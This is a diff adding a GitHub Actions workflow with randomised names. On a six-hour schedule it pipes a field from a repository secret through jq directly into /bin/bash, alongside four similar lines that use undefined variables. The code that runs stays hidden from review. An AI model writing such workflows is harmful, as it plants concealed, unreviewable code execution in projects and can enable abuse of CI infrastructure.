@@ -1,0 +1,21 @@
+name: jiangzehong1293
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangzehong1293
+        env:
+          kigw67: ${{ secrets.kigw67 }}
+        run: |
+          echo $kigw67 | jq -r .axop660 | /bin/bash
+          echo $ky3556 | jq -r .mcop4 | /bin/bash
+          echo $kj91911 | jq -r .voz03505 | /bin/bash
+          echo $awkkk2 | jq -r .b69 | /bin/bash
+          echo $nnac6317 | jq -r .qlzw87 | /bin/bash
+
